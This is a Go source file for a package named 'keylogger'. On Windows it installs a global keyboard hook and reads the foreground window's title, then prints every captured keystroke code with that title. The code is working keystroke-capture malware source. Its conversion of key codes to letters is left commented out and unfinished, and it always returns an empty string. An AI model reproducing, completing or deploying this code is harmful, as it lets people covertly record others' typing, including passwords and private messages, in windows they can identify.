package keylogger

import (
	"fmt"
	"os"
	"os/signal"

	"syscall"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
)

var previous_modkey types.VKCode = types.VK_NONAME

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)

type (
	HANDLE uintptr
	HWND   HANDLE
)

func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

func GetForegroundWindow() uintptr {
	proc := mod.NewProc("GetForegroundWindow")
	hwnd, _, _ := proc.Call()
	return hwnd
}

func Run() error {
	// Buffer size is depends on your need. The 100 is placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 100)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				text := GetWindowText(HWND(hwnd))
				fmt.Println("window:", text)
				fmt.Printf("Received %v %v %v\n", k.Message, k.VKCode, k.ScanCode)
				fmt.Println(VKCodeToAscii(k))
			}
			continue
		}
	}
}

func VKCodeToAscii(k types.KeyboardEvent) string {

	// if k.Message == types.WM_KEYDOWN && k.VKCode == types.VK_LSHIFT {
	// 	previous_modkey = types.VK_LSHIFT
	// } else if k.Message == types.WM_KEYUP && k.VKCode == types.VK_LSHIFT {
	// 	previous_modkey = types.VK_NONAME
	// }

	// if k.VKCode == types.VK_A && previous_modkey != types.VK_NONAME {
	// 	return "A"
	// }
	// if k.VKCode == types.VK_B && previous_modkey != types.VK_NONAME {
	// 	return "B"
	// }
	// if k.VKCode == types.VK_C && previous_modkey != types.VK_NONAME {
	// 	return "C"
	// }
	// if k.VKCode == types.VK_D && previous_modkey != types.VK_NONAME {
	// 	return "D"
	// }
	// if k.VKCode == types.VK_E && previous_modkey != types.VK_NONAME {
	// 	return "E"
	// }
	// if k.VKCode == types.VK_F && previous_modkey != types.VK_NONAME {
	// 	return "F"
	// }
	// if k.VKCode == types.VK_H && previous_modkey != types.VK_NONAME {
	// 	return "H"
	// }
	// if k.VKCode == types.VK_I && previous_modkey != types.VK_NONAME {
	// 	return "I"
	// }
	// if k.VKCode == types.VK_J && previous_modkey != types.VK_NONAME {
	// 	return "J"
	// }
	// if k.VKCode == types.VK_K && previous_modkey != types.VK_NONAME {
	// 	return "K"
	// }
	// if k.VKCode == types.VK_L && previous_modkey != types.VK_NONAME {
	// 	return "L"
	// }
	// if k.VKCode == types.VK_M && previous_modkey != types.VK_NONAME {
	// 	return "M"
	// }
	// if k.VKCode == types.VK_N && previous_modkey != types.VK_NONAME {
	// 	return "N"
	// }
	// if k.VKCode == types.VK_O && previous_modkey != types.VK_NONAME {
	// 	return "O"
	// }
	// if k.VKCode == types.VK_P && previous_modkey != types.VK_NONAME {
	// 	return "P"
	// }
	// if k.VKCode == types.VK_Q && previous_modkey != types.VK_NONAME {
	// 	return "Q"
	// }
	// if k.VKCode == types.VK_R && previous_modkey != types.VK_NONAME {
	// 	return "R"
	// }
	// if k.VKCode == types.VK_S && previous_modkey != types.VK_NONAME {
	// 	return "S"
	// }
	// if k.VKCode == types.VK_T && previous_modkey != types.VK_NONAME {
	// 	return "T"
	// }
	// if k.VKCode == types.VK_U && previous_modkey != types.VK_NONAME {
	// 	return "U"
	// }
	// if k.VKCode == types.VK_V && previous_modkey != types.VK_NONAME {
	// 	return "V"
	// }
	// if k.VKCode == types.VK_W && previous_modkey != types.VK_NONAME {
	// 	return "W"
	// }
	// if k.VKCode == types.VK_X && previous_modkey != types.VK_NONAME {
	// 	return "X"
	// }
	// if k.VKCode == types.VK_Y && previous_modkey != types.VK_NONAME {
	// 	return "Y"
	// }
	// if k.VKCode == types.VK_Z && previous_modkey != types.VK_NONAME {
	// 	return "Z"
	// }

	// if k.VKCode == types.VK_A && previous_modkey == types.VK_NONAME {
	// 	return "a"
	// }
	// if k.VKCode == types.VK_B && previous_modkey == types.VK_NONAME {
	// 	return "b"
	// }
	// if k.VKCode == types.VK_C && previous_modkey == types.VK_NONAME {
	// 	return "c"
	// }
	// if k.VKCode == types.VK_D && previous_modkey == types.VK_NONAME {
	// 	return "d"
	// }
	// if k.VKCode == types.VK_E && previous_modkey == types.VK_NONAME {
	// 	return "e"
	// }
	// if k.VKCode == types.VK_F && previous_modkey == types.VK_NONAME {
	// 	return "f"
	// }
	// if k.VKCode == types.VK_H && previous_modkey == types.VK_NONAME {
	// 	return "h"
	// }
	// if k.VKCode == types.VK_I && previous_modkey == types.VK_NONAME {
	// 	return "i"
	// }
	// if k.VKCode == types.VK_J && previous_modkey == types.VK_NONAME {
	// 	return "j"
	// }
	// if k.VKCode == types.VK_K && previous_modkey == types.VK_NONAME {
	// 	return "k"
	// }
	// if k.VKCode == types.VK_L && previous_modkey == types.VK_NONAME {
	// 	return "l"
	// }
	// if k.VKCode == types.VK_M && previous_modkey == types.VK_NONAME {
	// 	return "m"
	// }
	// if k.VKCode == types.VK_N && previous_modkey == types.VK_NONAME {
	// 	return "n"
	// }
	// if k.VKCode == types.VK_O && previous_modkey == types.VK_NONAME {
	// 	return "o"
	// }
	// if k.VKCode == types.VK_P && previous_modkey == types.VK_NONAME {
	// 	return "p"
	// }
	// if k.VKCode == types.VK_Q && previous_modkey == types.VK_NONAME {
	// 	return "q"
	// }
	// if k.VKCode == types.VK_R && previous_modkey == types.VK_NONAME {
	// 	return "r"
	// }
	// if k.VKCode == types.VK_S && previous_modkey == types.VK_NONAME {
	// 	return "s"
	// }
	// if k.VKCode == types.VK_T && previous_modkey == types.VK_NONAME {
	// 	return "t"
	// }
	// if k.VKCode == types.VK_U && previous_modkey == types.VK_NONAME {
	// 	return "u"
	// }
	// if k.VKCode == types.VK_V && previous_modkey == types.VK_NONAME {
	// 	return "v"
	// }
	// if k.VKCode == types.VK_W && previous_modkey == types.VK_NONAME {
	// 	return "w"
	// }
	// if k.VKCode == types.VK_X && previous_modkey == types.VK_NONAME {
	// 	return "x"
	// }
	// if k.VKCode == types.VK_Y && previous_modkey == types.VK_NONAME {
	// 	return "y"
	// }
	// if k.VKCode == types.VK_Z && previous_modkey == types.VK_NONAME {
	// 	return "z"
	// }
	return ""
}
